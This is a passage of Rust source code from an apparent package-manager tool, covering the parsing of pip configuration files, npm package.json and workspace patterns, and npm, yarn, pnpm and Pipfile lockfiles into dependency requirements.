                .into_iter()
                .filter_map(|index_url| normalize_pypi_simple_index_url(&index_url)),
        );
    }
    if let Some(find_links) = find_links {
        options.pypi_find_links.extend(
            pypi_index_url_values(find_links)
                .into_iter()
                .filter_map(|find_links| normalize_pypi_find_links_source(&find_links, base_dir)),
        );
    }
    options.pypi_no_index |= no_index;
    dedupe_pypi_find_links(options);
    dedupe_pypi_extra_index_urls(options);
}

#[derive(Debug, Clone, Default, PartialEq, Eq)]
struct PipConfig {
    index_url: Option<String>,
    extra_index_urls: Vec<String>,
    find_links: Vec<String>,
    no_index: bool,
}

fn apply_pip_config_files(project_dir: &Path, options: &mut LinkOptions) -> Result<()> {
    let config = read_pip_config(project_dir)?;
    if options.pypi_index_url.is_none() {
        options.pypi_index_url = config.index_url;
    }
    options
        .pypi_extra_index_urls
        .extend(config.extra_index_urls);
    options.pypi_find_links.extend(config.find_links);
    options.pypi_no_index |= config.no_index;
    dedupe_pypi_find_links(options);
    dedupe_pypi_extra_index_urls(options);
    Ok(())
}

fn read_pip_config(project_dir: &Path) -> Result<PipConfig> {
    let mut config = PipConfig::default();
    if let Some(home) = env::var_os("HOME") {
        let home = PathBuf::from(home);
        read_pip_config_into(&home.join(".pip").join("pip.conf"), &mut config)?;
        read_pip_config_into(
            &home.join(".config").join("pip").join("pip.conf"),
            &mut config,
        )?;
    }
    read_pip_config_into(&project_dir.join("pip.conf"), &mut config)?;
    if let Some(path) = env::var_os("PIP_CONFIG_FILE") {
        read_pip_config_into(&PathBuf::from(path), &mut config)?;
    }
    Ok(config)
}

fn read_pip_config_into(path: &Path, config: &mut PipConfig) -> Result<()> {
    if !path.exists() {
        return Ok(());
    }
    let base_dir = path.parent().unwrap_or_else(|| Path::new("."));
    parse_pip_config_content(&fs::read_to_string(path)?, base_dir, config);
    Ok(())
}

fn parse_pip_config_content(content: &str, base_dir: &Path, config: &mut PipConfig) {
    let mut section = String::new();
    let mut multiline_key: Option<String> = None;
    for raw_line in content.lines() {
        let line = strip_npmrc_comment(raw_line);
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        if trimmed.starts_with('[') && trimmed.ends_with(']') {
            section = trimmed
                .trim_start_matches('[')
                .trim_end_matches(']')
                .trim()
                .to_ascii_lowercase();
            multiline_key = None;
            continue;
        }
        let indented = raw_line
            .chars()
            .next()
            .map(char::is_whitespace)
            .unwrap_or(false);
        if indented && multiline_key.is_some() && !trimmed.contains('=') {
            if let Some(key) = multiline_key.as_deref() {
                apply_pip_config_value(&section, key, trimmed, base_dir, config);
            }
            continue;
        }
        let Some((key, value)) = trimmed.split_once('=') else {
            multiline_key = None;
            continue;
        };
        let key = key.trim().to_ascii_lowercase();
        let value = value.trim();
        apply_pip_config_value(&section, &key, value, base_dir, config);
        multiline_key = value.is_empty().then_some(key);
    }
}

fn apply_pip_config_value(
    section: &str,
    key: &str,
    value: &str,
    base_dir: &Path,
    config: &mut PipConfig,
) {
    if !matches!(section, "global" | "install") {
        return;
    }
    match key {
        "index-url" => {
            if let Some(index_url) = normalize_pypi_simple_index_url(value) {
                config.index_url = Some(index_url);
            }
        }
        "extra-index-url" => {
            config.extra_index_urls.extend(
                pypi_index_url_values(value)
                    .into_iter()
                    .filter_map(|index_url| normalize_pypi_simple_index_url(&index_url)),
            );
        }
        "find-links" => {
            config.find_links.extend(
                pypi_index_url_values(value)
                    .into_iter()
                    .filter_map(|find_links| {
                        normalize_pypi_find_links_source(&find_links, base_dir)
                    }),
            );
        }
        "no-index" => {
            config.no_index |= pip_config_bool(value);
        }
        _ => {}
    }
    let mut seen = BTreeSet::new();
    config
        .extra_index_urls
        .retain(|index_url| seen.insert(index_url.clone()));
    let mut seen = BTreeSet::new();
    config
        .find_links
        .retain(|find_links| seen.insert(find_links.clone()));
}

fn pypi_index_url_values(value: &str) -> Vec<String> {
    shell_like_tokens(value)
}

fn pip_config_bool(value: &str) -> bool {
    matches!(
        value.trim().to_ascii_lowercase().as_str(),
        "1" | "yes" | "true" | "on"
    )
}

fn env_truthy(name: &str) -> bool {
    env::var(name)
        .ok()
        .map(|value| pip_config_bool(&value))
        .unwrap_or(false)
}

fn dedupe_pypi_extra_index_urls(options: &mut LinkOptions) {
    let mut seen = BTreeSet::new();
    options
        .pypi_extra_index_urls
        .retain(|index_url| seen.insert(index_url.clone()));
}

fn dedupe_pypi_find_links(options: &mut LinkOptions) {
    let mut seen = BTreeSet::new();
    options
        .pypi_find_links
        .retain(|find_links| seen.insert(find_links.clone()));
}

fn prune_lockfile(project_dir: &Path, retained: &BTreeSet<String>) -> Result<usize> {
    let lockfile = project_dir.join(LOCKFILE);
    let mut lock = read_lockfile(&lockfile)?;
    let before = lock.packages.len();
    lock.packages
        .retain(|package| retained.contains(&locked_package_key(package)));
    let removed = before.saturating_sub(lock.packages.len());
    if removed > 0 || before == 0 {
        fs::write(lockfile, toml::to_string_pretty(&lock)?)?;
    }
    Ok(removed)
}

fn sync_python_vcs_lockfile(
    project_dir: &Path,
    dependencies: Vec<LockedPythonVcsDependency>,
) -> Result<()> {
    let lockfile = project_dir.join(LOCKFILE);
    let mut lock = read_lockfile(&lockfile)?;
    lock.replace_python_vcs(dependencies);
    fs::write(lockfile, toml::to_string_pretty(&lock)?)?;
    Ok(())
}

fn locked_package_key(package: &LockedPackage) -> String {
    format!("{}:{}@{}", package.ecosystem, package.name, package.version)
}

#[cfg(test)]
fn read_package_json_specs(
    path: &Path,
    include_dev_dependencies: bool,
) -> Result<Vec<PackageSpec>> {
    Ok(read_package_json_requirements(path, include_dev_dependencies)?.specs)
}

fn read_package_json_requirements(
    path: &Path,
    include_dev_dependencies: bool,
) -> Result<ProjectRequirements> {
    let package = serde_json::from_str::<ProjectPackageJson>(&fs::read_to_string(path)?)?;
    let base_dir = path.parent().unwrap_or_else(|| Path::new("."));
    let workspaces = package.workspaces.clone();
    let mut requirements = ProjectRequirements::default();
    collect_package_json_constraints(&package, &mut requirements.constraints);
    requirements.specs.extend(package_json_dependency_specs(
        package,
        include_dev_dependencies,
        base_dir,
    )?);

    if let Some(workspaces) = workspaces {
        for package_json in workspace_package_json_paths(base_dir, &workspaces) {
            let workspace_base_dir = package_json.parent().unwrap_or(base_dir);
            let package =
                serde_json::from_str::<ProjectPackageJson>(&fs::read_to_string(&package_json)?)?;
            collect_package_json_constraints(&package, &mut requirements.constraints);
            requirements.specs.extend(package_json_dependency_specs(
                package,
                include_dev_dependencies,
                workspace_base_dir,
            )?);
        }
    }

    Ok(requirements)
}

fn package_json_dependency_specs(
    package: ProjectPackageJson,
    include_dev_dependencies: bool,
    base_dir: &Path,
) -> Result<Vec<PackageSpec>> {
    let mut specs = Vec::new();
    let dev_dependencies = if include_dev_dependencies {
        package.dev_dependencies
    } else {
        BTreeMap::new()
    };

    for dependencies in [
        package.dependencies,
        dev_dependencies,
        package.optional_dependencies,
        required_peer_dependencies(package.peer_dependencies, package.peer_dependencies_meta),
    ] {
        for (name, requirement) in dependencies {
            if let Some(spec) = npm_package_json_dependency_spec(name, requirement, base_dir)? {
                specs.push(spec);
            }
        }
    }

    Ok(specs)
}

fn collect_package_json_constraints(
    package: &ProjectPackageJson,
    constraints: &mut BTreeMap<String, String>,
) {
    collect_npm_override_constraints(&package.overrides, constraints);
    collect_npm_resolution_constraints(&package.resolutions, constraints);
}

fn collect_npm_override_constraints(
    overrides: &BTreeMap<String, serde_json::Value>,
    constraints: &mut BTreeMap<String, String>,
) {
    for (selector, value) in overrides {
        collect_npm_override_constraint(selector, value, constraints);
    }
}

fn collect_npm_override_constraint(
    selector: &str,
    value: &serde_json::Value,
    constraints: &mut BTreeMap<String, String>,
) {
    if let Some(version) = value.as_str().and_then(npm_constraint_version) {
        if let Some(name) = npm_selector_package_name(selector) {
            constraints.insert(format!("npm:{name}"), version.to_owned());
        }
        return;
    }

    let Some(table) = value.as_object() else {
        return;
    };
    if let Some(version) = table
        .get(".")
        .and_then(serde_json::Value::as_str)
        .and_then(npm_constraint_version)
    {
        if let Some(name) = npm_selector_package_name(selector) {
            constraints.insert(format!("npm:{name}"), version.to_owned());
        }
    }
    for (nested_selector, nested_value) in table {
        if nested_selector == "." {
            continue;
        }
        collect_npm_override_constraint(nested_selector, nested_value, constraints);
    }
}

fn collect_npm_resolution_constraints(
    resolutions: &BTreeMap<String, serde_json::Value>,
    constraints: &mut BTreeMap<String, String>,
) {
    for (selector, value) in resolutions {
        let Some(version) = value.as_str().and_then(npm_constraint_version) else {
            continue;
        };
        let Some(name) = npm_selector_package_name(selector) else {
            continue;
        };
        constraints.insert(format!("npm:{name}"), version.to_owned());
    }
}

fn npm_constraint_version(version: &str) -> Option<&str> {
    let version = version.trim();
    if version.is_empty()
        || version.starts_with('$')
        || version.starts_with("file:")
        || version.starts_with("link:")
        || version.starts_with("workspace:")
        || version.contains("://")
    {
        None
    } else {
        Some(version)
    }
}

fn npm_selector_package_name(selector: &str) -> Option<String> {
    let selector = selector
        .rsplit('>')
        .next()
        .unwrap_or(selector)
        .trim()
        .trim_start_matches("**/");
    let segments = selector
        .split('/')
        .filter(|segment| !segment.is_empty() && *segment != "*" && *segment != "**")
        .collect::<Vec<_>>();
    let candidate = if segments.len() >= 2 && segments[segments.len() - 2].starts_with('@') {
        format!(
            "{}/{}",
            segments[segments.len() - 2],
            segments[segments.len() - 1]
        )
    } else {
        segments.last().copied()?.to_owned()
    };
    let name = strip_npm_selector_version(&candidate);
    (!name.is_empty()).then_some(name)
}

fn strip_npm_selector_version(selector: &str) -> String {
    if let Some(rest) = selector.strip_prefix('@') {
        let Some((scope, package)) = rest.split_once('/') else {
            return selector.to_owned();
        };
        let package = package
            .split_once('@')
            .map(|(name, _)| name)
            .unwrap_or(package);
        format!("@{scope}/{package}")
    } else {
        selector
            .split_once('@')
            .map(|(name, _)| name)
            .unwrap_or(selector)
            .to_owned()
    }
}

fn npm_package_json_dependency_spec(
    name: String,
    requirement: String,
    base_dir: &Path,
) -> Result<Option<PackageSpec>> {
    let requirement = requirement.trim();
    if requirement.starts_with("workspace:") {
        return Ok(None);
    }

    if npm_local_directory_requirement_path(requirement, base_dir)?.is_some() {
        return Ok(None);
    }

    if let Some(url) = npm_direct_tarball_url(requirement, base_dir)? {
        return Ok(Some(PackageSpec::with_direct_url(
            Ecosystem::Npm,
            name,
            url,
            BTreeSet::new(),
        )));
    }

    Ok(Some(PackageSpec::new(
        Ecosystem::Npm,
        name,
        Some(requirement.to_owned()),
    )))
}

fn npm_local_directory_requirement_path(
    requirement: &str,
    base_dir: &Path,
) -> Result<Option<PathBuf>> {
    if let Some(path) = npm_local_protocol_path(requirement, "link:", base_dir)? {
        if path.is_dir() {
            return Ok(Some(path));
        }
        return Err(OmcRegistryError::UnsupportedSpec(format!(
            "local npm link dependency `{requirement}` must point to an existing directory"
        )));
    }

    let Some(path) = npm_local_protocol_path(requirement, "file:", base_dir)? else {
        return Ok(None);
    };
    if path.is_dir() {
        return Ok(Some(path));
    }
    if is_npm_tarball_path(path.to_string_lossy().as_ref()) {
        return Ok(None);
    }
    Err(OmcRegistryError::UnsupportedSpec(format!(
        "local npm file dependency `{requirement}` must be a .tgz/.tar.gz tarball or an existing directory"
    )))
}

fn npm_local_protocol_path(
    requirement: &str,
    protocol: &str,
    base_dir: &Path,
) -> Result<Option<PathBuf>> {
    let Some(path) = requirement.strip_prefix(protocol) else {
        return Ok(None);
    };
    let path = path.trim();
    if path.starts_with("//") {
        let url = reqwest::Url::parse(requirement)
            .map_err(|_| OmcRegistryError::UnsupportedSpec(requirement.to_owned()))?;
        return url.to_file_path().map(Some).map_err(|_| {
            OmcRegistryError::UnsupportedSpec(format!(
                "local npm dependency `{requirement}` must use a valid file URL"
            ))
        });
    }
    let path = Path::new(path);
    Ok(Some(if path.is_absolute() {
        path.to_path_buf()
    } else {
        base_dir.join(path)
    }))
}

fn npm_direct_tarball_url(requirement: &str, base_dir: &Path) -> Result<Option<String>> {
    if requirement.starts_with("https://") {
        require_npm_tarball_path(requirement)?;
        return Ok(Some(requirement.to_owned()));
    }

    if let Some(path) = requirement.strip_prefix("file:") {
        let path = path.trim();
        if path.starts_with("//") {
            let url = reqwest::Url::parse(requirement)
                .map_err(|_| OmcRegistryError::UnsupportedSpec(requirement.to_owned()))?;
            let path = url.to_file_path().map_err(|_| {
                OmcRegistryError::UnsupportedSpec(format!(
                    "direct npm tarball URL `{requirement}` must use a valid file URL"
                ))
            })?;
            require_npm_tarball_path(path.to_string_lossy().as_ref())?;
            return Ok(Some(url.to_string()));
        }

        let path = Path::new(path);
        let path = if path.is_absolute() {
            path.to_path_buf()
        } else {
            base_dir.join(path)
        };
        require_npm_tarball_path(path.to_string_lossy().as_ref())?;
        let url = reqwest::Url::from_file_path(&path).map_err(|_| {
            OmcRegistryError::UnsupportedSpec(format!(
                "direct npm tarball path `{}` could not be converted to a file URL",
                path.display()
            ))
        })?;
        return Ok(Some(url.to_string()));
    }

    if requirement.starts_with("http://") {
        return Err(OmcRegistryError::UnsupportedSpec(format!(
            "direct npm tarball URL `{requirement}` must use https"
        )));
    }

    Ok(None)
}

fn require_npm_tarball_path(path: &str) -> Result<()> {
    if is_npm_tarball_path(path) {
        return Ok(());
    }

    Err(OmcRegistryError::UnsupportedSpec(format!(
        "direct npm dependency `{path}` must be a .tgz or .tar.gz archive"
    )))
}

fn is_npm_tarball_path(path: &str) -> bool {
    let lower = path
        .split(['?', '#'])
        .next()
        .unwrap_or(path)
        .to_ascii_lowercase();
    lower.ends_with(".tgz") || lower.ends_with(".tar.gz")
}

fn workspace_package_json_paths(root: &Path, workspaces: &ProjectWorkspaces) -> Vec<PathBuf> {
    let mut includes = Vec::new();
    let mut excludes = Vec::new();
    for pattern in workspaces.patterns() {
        let pattern = pattern.trim();
        if pattern.is_empty() {
            continue;
        }
        if let Some(exclude) = pattern.strip_prefix('!') {
            excludes.push(exclude.trim());
        } else {
            includes.push(pattern);
        }
    }

    if includes.is_empty() {
        return Vec::new();
    }

    let root_package_json = root.join("package.json");
    let mut package_json_paths = Vec::new();
    let mut seen = BTreeSet::new();

    for entry in WalkDir::new(root)
        .follow_links(false)
        .into_iter()
        .filter_entry(should_enter_workspace_dir)
        .filter_map(std::result::Result::ok)
    {
        if !entry.file_type().is_file() || entry.file_name() != "package.json" {
            continue;
        }

        let package_json = entry.path();
        if package_json == root_package_json {
            continue;
        }

        let Some(package_dir) = package_json.parent() else {
            continue;
        };
        let Ok(relative_dir) = package_dir.strip_prefix(root) else {
            continue;
        };

        if workspace_patterns_match(&includes, &excludes, relative_dir) {
            let package_json = package_json.to_path_buf();
            if seen.insert(package_json.clone()) {
                package_json_paths.push(package_json);
            }
        }
    }

    package_json_paths
}

fn should_enter_workspace_dir(entry: &DirEntry) -> bool {
    if entry.depth() == 0 || !entry.file_type().is_dir() {
        return true;
    }

    !matches!(
        entry.file_name().to_str(),
        Some("node_modules" | ".git" | ".omc")
    )
}

fn workspace_patterns_match(includes: &[&str], excludes: &[&str], relative_dir: &Path) -> bool {
    let segments = path_segments(relative_dir);
    includes
        .iter()
        .any(|pattern| workspace_pattern_matches(pattern, &segments))
        && !excludes
            .iter()
            .any(|pattern| workspace_pattern_matches(pattern, &segments))
}

fn workspace_pattern_matches(pattern: &str, path_segments: &[String]) -> bool {
    let pattern_segments = workspace_pattern_segments(pattern);
    workspace_segments_match(&pattern_segments, path_segments)
}

fn workspace_pattern_segments(pattern: &str) -> Vec<&str> {
    let pattern = pattern
        .trim()
        .trim_start_matches("./")
        .trim_end_matches('/')
        .trim_end_matches('\\');
    let pattern = pattern.strip_suffix("/package.json").unwrap_or(pattern);
    let pattern = pattern.strip_suffix("\\package.json").unwrap_or(pattern);

    pattern
        .split(['/', '\\'])
        .filter(|segment| !segment.is_empty())
        .collect()
}

fn path_segments(path: &Path) -> Vec<String> {
    path.components()
        .filter_map(|component| match component {
            std::path::Component::Normal(segment) => {
                segment.to_str().map(std::borrow::ToOwned::to_owned)
            }
            _ => None,
        })
        .collect()
}

fn workspace_segments_match(pattern_segments: &[&str], path_segments: &[String]) -> bool {
    let Some((pattern_segment, remaining_pattern)) = pattern_segments.split_first() else {
        return path_segments.is_empty();
    };

    if *pattern_segment == "**" {
        return workspace_segments_match(remaining_pattern, path_segments)
            || (!path_segments.is_empty()
                && workspace_segments_match(pattern_segments, &path_segments[1..]));
    }

    let Some((path_segment, remaining_path)) = path_segments.split_first() else {
        return false;
    };

    workspace_segment_matches(pattern_segment, path_segment)
        && workspace_segments_match(remaining_pattern, remaining_path)
}

fn workspace_segment_matches(pattern: &str, value: &str) -> bool {
    if !pattern.contains('*') {
        return pattern == value;
    }

    let starts_with_star = pattern.starts_with('*');
    let ends_with_star = pattern.ends_with('*');
    let mut rest = value;
    let mut first = true;
    let mut matched_any_part = false;

    for part in pattern.split('*').filter(|part| !part.is_empty()) {
        matched_any_part = true;
        if first && !starts_with_star {
            let Some(next) = rest.strip_prefix(part) else {
                return false;
            };
            rest = next;
        } else {
            let Some(index) = rest.find(part) else {
                return false;
            };
            rest = &rest[index + part.len()..];
        }
        first = false;
    }

    if !matched_any_part {
        return true;
    }

    if !ends_with_star {
        if let Some(last_part) = pattern.rsplit('*').find(|part| !part.is_empty()) {
            return value.ends_with(last_part);
        }
    }

    true
}

fn required_peer_dependencies(
    peer_dependencies: BTreeMap<String, String>,
    peer_dependencies_meta: BTreeMap<String, NpmPeerDependencyMeta>,
) -> BTreeMap<String, String> {
    peer_dependencies
        .into_iter()
        .filter(|(name, _)| {
            !peer_dependencies_meta
                .get(name)
                .map(|meta| meta.optional)
                .unwrap_or(false)
        })
        .collect()
}

fn read_package_lock_requirements(path: &Path) -> Result<ProjectRequirements> {
    let lock = serde_json::from_str::<NpmPackageLock>(&fs::read_to_string(path)?)?;
    let mut versions = BTreeMap::<String, BTreeSet<String>>::new();
    let mut integrities = BTreeMap::<String, BTreeSet<String>>::new();
    let mut resolved = BTreeMap::<String, BTreeSet<String>>::new();

    for (path, package) in lock.packages {
        if path.is_empty() {
            continue;
        }
        let Some(name) = npm_package_name_from_lock_path(&path) else {
            continue;
        };
        if let Some(version) = package.version {
            versions.entry(name.clone()).or_default().insert(version);
        }
        if let Some(integrity) = package.integrity {
            integrities
                .entry(name.clone())
                .or_default()
                .insert(integrity);
        }
        if let Some(url) = package.resolved {
            resolved.entry(name).or_default().insert(url);
        }
    }

    collect_npm_lock_dependency_requirements(
        lock.dependencies,
        &mut versions,
        &mut integrities,
        &mut resolved,
    );

    Ok(npm_requirements_from_lock_maps(
        versions,
        integrities,
        resolved,
    ))
}

fn read_yarn_lock_requirements(path: &Path) -> Result<ProjectRequirements> {
    let content = fs::read_to_string(path)?;
    let mut versions = BTreeMap::<String, BTreeSet<String>>::new();
    let mut integrities = BTreeMap::<String, BTreeSet<String>>::new();
    let mut resolved = BTreeMap::<String, BTreeSet<String>>::new();
    let mut entry: Option<YarnLockEntry> = None;

    for line in content.lines() {
        let line = line.trim_end();
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

        let starts_indented = line
            .chars()
            .next()
            .map(char::is_whitespace)
            .unwrap_or(false);
        if !starts_indented && trimmed.ends_with(':') {
            collect_yarn_lock_entry(entry.take(), &mut versions, &mut integrities, &mut resolved);
            entry = Some(YarnLockEntry {
                selectors: parse_yarn_lock_selectors(trimmed.trim_end_matches(':')),
                version: None,
                resolved: None,
                integrity: None,
            });
            continue;
        }

        let Some(entry) = entry.as_mut() else {
            continue;
        };
        if let Some(value) = trimmed.strip_prefix("version ") {
            entry.version = Some(yarn_lock_value(value));
        } else if let Some(value) = trimmed.strip_prefix("resolved ") {
            entry.resolved = Some(yarn_lock_value(value));
        } else if let Some(value) = trimmed.strip_prefix("integrity ") {
            entry.integrity = Some(yarn_lock_value(value));
        }
    }

    collect_yarn_lock_entry(entry, &mut versions, &mut integrities, &mut resolved);

    Ok(npm_requirements_from_lock_maps(
        versions,
        integrities,
        resolved,
    ))
}

fn read_pnpm_lock_requirements(
    path: &Path,
    include_dev_dependencies: bool,
) -> Result<ProjectRequirements> {
    let lock = serde_yaml::from_str::<PnpmLock>(&fs::read_to_string(path)?)
        .map_err(|error| OmcRegistryError::UnsupportedRequirement(error.to_string()))?;
    let mut requirements = ProjectRequirements::default();
    let mut versions = BTreeMap::<String, BTreeSet<String>>::new();
    let mut integrities = BTreeMap::<String, BTreeSet<String>>::new();
    let mut resolved = BTreeMap::<String, BTreeSet<String>>::new();

    for importer in lock.importers.into_values() {
        collect_pnpm_importer_dependencies(importer.dependencies, &mut requirements, &mut versions);
        collect_pnpm_importer_dependencies(
            importer.optional_dependencies,
            &mut requirements,
            &mut versions,
        );
        if include_dev_dependencies {
            collect_pnpm_importer_dependencies(
                importer.dev_dependencies,
                &mut requirements,
                &mut versions,
            );
        }
    }

    for (key, package) in lock.packages {
        let Some((name, version)) = pnpm_package_key_name_and_version(&key) else {
            continue;
        };
        versions.entry(name.clone()).or_default().insert(version);
        if let Some(integrity) = package.resolution.as_ref().and_then(|resolution| {
            resolution
                .integrity
                .as_deref()
                .filter(|integrity| !integrity.trim().is_empty())
        }) {
            integrities
                .entry(name.clone())
                .or_default()
                .insert(integrity.to_owned());
        }
        if let Some(tarball) = package.resolution.as_ref().and_then(|resolution| {
            resolution
                .tarball
                .as_deref()
                .filter(|tarball| tarball.starts_with("https://"))
        }) {
            resolved.entry(name).or_default().insert(tarball.to_owned());
        }
    }

    let lock_requirements = npm_requirements_from_lock_maps(versions, integrities, resolved);
    requirements
        .constraints
        .extend(lock_requirements.constraints);
    requirements
        .npm_integrities
        .extend(lock_requirements.npm_integrities);
    requirements
        .npm_resolved
        .extend(lock_requirements.npm_resolved);
    Ok(requirements)
}

fn collect_pnpm_importer_dependencies(
    dependencies: BTreeMap<String, PnpmImporterDependency>,
    requirements: &mut ProjectRequirements,
    versions: &mut BTreeMap<String, BTreeSet<String>>,
) {
    for (name, dependency) in dependencies {
        let Some(version) = dependency.locked_version().and_then(pnpm_locked_version) else {
            continue;
        };
        requirements.specs.push(PackageSpec::new(
            Ecosystem::Npm,
            name.clone(),
            Some(version.clone()),
        ));
        versions.entry(name).or_default().insert(version);
    }
}

fn pnpm_locked_version(version: &str) -> Option<String> {
    let version = version.trim();
    if version.is_empty()
        || version.starts_with("link:")
        || version.starts_with("workspace:")
        || version.starts_with("file:")
        || version.starts_with("patch:")
    {
        return None;
    }

    let version = version.split('(').next().unwrap_or(version).trim();
    (!version.is_empty()).then_some(version.to_owned())
}

fn pnpm_package_key_name_and_version(key: &str) -> Option<(String, String)> {
    let key = key
        .trim()
        .trim_start_matches('/')
        .split('(')
        .next()
        .unwrap_or_default();
    let version_separator = key.rfind('@')?;
    if version_separator == 0 {
        return None;
    }
    let name = key[..version_separator].to_owned();
    let version = key[version_separator + 1..].to_owned();
    if name.is_empty() || version.is_empty() {
        return None;
    }
    Some((name, version))
}

fn collect_yarn_lock_entry(
    entry: Option<YarnLockEntry>,
    versions: &mut BTreeMap<String, BTreeSet<String>>,
    integrities: &mut BTreeMap<String, BTreeSet<String>>,
    resolved: &mut BTreeMap<String, BTreeSet<String>>,
) {
    let Some(entry) = entry else {
        return;
    };
    let Some(version) = entry.version else {
        return;
    };

    for selector in entry.selectors {
        let Some(name) = npm_package_name_from_yarn_selector(&selector) else {
            continue;
        };
        versions
            .entry(name.clone())
            .or_default()
            .insert(version.clone());
        if let Some(integrity) = &entry.integrity {
            integrities
                .entry(name.clone())
                .or_default()
                .insert(integrity.clone());
        }
        if let Some(url) = entry
            .resolved
            .as_deref()
            .filter(|url| url.starts_with("https://"))
        {
            resolved.entry(name).or_default().insert(url.to_owned());
        }
    }
}

fn parse_yarn_lock_selectors(raw: &str) -> Vec<String> {
    let mut selectors = Vec::new();
    let mut current = String::new();
    let mut in_quote = false;
    let mut escaped = false;

    for character in raw.chars() {
        if escaped {
            current.push(character);
            escaped = false;
            continue;
        }
        if in_quote && character == '\\' {
            escaped = true;
            continue;
        }
        if character == '"' {
            in_quote = !in_quote;
            continue;
        }
        if character == ',' && !in_quote {
            let selector = current.trim();
            if !selector.is_empty() {
                selectors.push(selector.to_owned());
            }
            current.clear();
            continue;
        }
        current.push(character);
    }

    let selector = current.trim();
    if !selector.is_empty() {
        selectors.push(selector.to_owned());
    }

    selectors
}

fn yarn_lock_value(value: &str) -> String {
    let value = value.trim();
    if value.len() >= 2 && value.starts_with('"') && value.ends_with('"') {
        value[1..value.len() - 1]
            .replace("\\\"", "\"")
            .replace("\\\\", "\\")
    } else {
        value.to_owned()
    }
}

fn npm_package_name_from_yarn_selector(selector: &str) -> Option<String> {
    let selector = selector.trim();
    if selector.is_empty() {
        return None;
    }

    if let Some((alias, _)) = selector.split_once("@npm:") {
        return if alias.is_empty() {
            None
        } else {
            Some(alias.to_owned())
        };
    }

    let version_separator = selector.rfind('@')?;
    if version_separator == 0 && selector.starts_with('@') {
        return None;
    }
    Some(selector[..version_separator].to_owned())
}

fn npm_requirements_from_lock_maps(
    versions: BTreeMap<String, BTreeSet<String>>,
    integrities: BTreeMap<String, BTreeSet<String>>,
    resolved: BTreeMap<String, BTreeSet<String>>,
) -> ProjectRequirements {
    let constraints = versions
        .into_iter()
        .filter_map(|(name, versions)| {
            if versions.len() == 1 {
                versions
                    .into_iter()
                    .next()
                    .map(|version| (format!("npm:{name}"), version))
            } else {
                None
            }
        })
        .collect::<BTreeMap<_, _>>();
    let npm_integrities = integrities
        .into_iter()
        .filter(|(name, _)| constraints.contains_key(&format!("npm:{name}")))
        .map(|(name, values)| (format!("npm:{name}"), values))
        .collect();
    let npm_resolved = resolved
        .into_iter()
        .filter_map(|(name, values)| {
            let key = format!("npm:{name}");
            if constraints.contains_key(&key) && values.len() == 1 {
                values.into_iter().next().map(|url| (key, url))
            } else {
                None
            }
        })
        .collect();

    ProjectRequirements {
        specs: Vec::new(),
        constraints,
        hashes: BTreeMap::new(),
        npm_integrities,
        npm_resolved,
        pypi_index_url: None,
        pypi_extra_index_urls: Vec::new(),
        pypi_find_links: Vec::new(),
        pypi_no_index: false,
        pypi_require_hashes: false,
        python_local_paths: Vec::new(),
        python_vcs_requirements: Vec::new(),
    }
}

fn collect_npm_lock_dependency_requirements(
    dependencies: BTreeMap<String, NpmPackageLockDependency>,
    versions: &mut BTreeMap<String, BTreeSet<String>>,
    integrities: &mut BTreeMap<String, BTreeSet<String>>,
    resolved: &mut BTreeMap<String, BTreeSet<String>>,
) {
    for (name, dependency) in dependencies {
        if let Some(version) = dependency.version {
            versions.entry(name.clone()).or_default().insert(version);
        }
        if let Some(integrity) = dependency.integrity {
            integrities
                .entry(name.clone())
                .or_default()
                .insert(integrity);
        }
        if let Some(url) = dependency.resolved {
            resolved.entry(name).or_default().insert(url);
        }
        collect_npm_lock_dependency_requirements(
            dependency.dependencies,
            versions,
            integrities,
            resolved,
        );
    }
}

fn npm_package_name_from_lock_path(path: &str) -> Option<String> {
    let mut components = path.split('/').peekable();
    let mut name = None;

    while let Some(component) = components.next() {
        if component != "node_modules" {
            continue;
        }
        let package = components.next()?;
        if package.starts_with('@') {
            let scoped = components.next()?;
            name = Some(format!("{package}/{scoped}"));
        } else {
            name = Some(package.to_owned());
        }
    }

    name
}

#[cfg(test)]
fn read_requirements_file(path: &Path) -> Result<ProjectRequirements> {
    read_requirements_files(&[path.to_path_buf()])
}

fn read_requirements_files(paths: &[PathBuf]) -> Result<ProjectRequirements> {
    let mut discovered = ProjectRequirements::default();
    let mut seen = BTreeSet::new();
    for path in paths {
        read_requirements_file_inner(path, RequirementsMode::Install, &mut seen, &mut discovered)?;
    }
    if discovered.pypi_require_hashes {
        enforce_requirements_hashes(&discovered)?;
    }
    Ok(discovered)
}

fn read_constraint_files(paths: &[PathBuf]) -> Result<ProjectRequirements> {
    let mut discovered = ProjectRequirements::default();
    let mut seen = BTreeSet::new();
    for path in paths {
        read_requirements_file_inner(
            path,
            RequirementsMode::Constraint,
            &mut seen,
            &mut discovered,
        )?;
    }
    Ok(discovered)
}

fn read_pipfile_lock_requirements(
    path: &Path,
    include_dev_dependencies: bool,
) -> Result<ProjectRequirements> {
    let lock = serde_json::from_str::<PipfileLock>(&fs::read_to_string(path)?)?;
    let base_dir = path.parent().unwrap_or_else(|| Path::new("."));
    let mut requirements = ProjectRequirements::default();

    collect_pipfile_lock_sources(&lock.metadata, &mut requirements);
    collect_pipfile_locked_packages(lock.default, base_dir, &mut requirements)?;
    if include_dev_dependencies {
        collect_pipfile_locked_packages(lock.develop, base_dir, &mut requirements)?;
    }

    Ok(requirements)
}

fn read_pipfile_requirements(
    path: &Path,
    include_dev_dependencies: bool,
) -> Result<ProjectRequirements> {
    let pipfile = toml::from_str::<Pipfile>(&fs::read_to_string(path)?)?;
    let base_dir = path.parent().unwrap_or_else(|| Path::new("."));
    let mut requirements = ProjectRequirements::default();

    collect_pipfile_sources(&pipfile.source, &mut requirements);
    collect_pipfile_packages(pipfile.packages, base_dir, &mut requirements)?;
    if include_dev_dependencies {
        collect_pipfile_packages(pipfile.dev_packages, base_dir, &mut requirements)?;
    }

    Ok(requirements)
}

fn read_pipfile_scripts(path: &Path) -> Result<BTreeMap<String, String>> {
    Ok(toml::from_str::<PipfileScripts>(&fs::read_to_string(path)?)?.scripts)
}

fn collect_pipfile_sources(sources: &[PipfileSource], requirements: &mut ProjectRequirements) {
    for source in sources {
        let Some(index_url) = source
            .url
            .as_deref()
            .and_then(normalize_pypi_simple_index_url)
        else {
            continue;
        };

        push_project_pypi_index_url(requirements, index_url);
    }
}

fn collect_pipfile_packages(
    packages: BTreeMap<String, PipfilePackage>,
    base_dir: &Path,
    requirements: &mut ProjectRequirements,
) -> Result<()> {
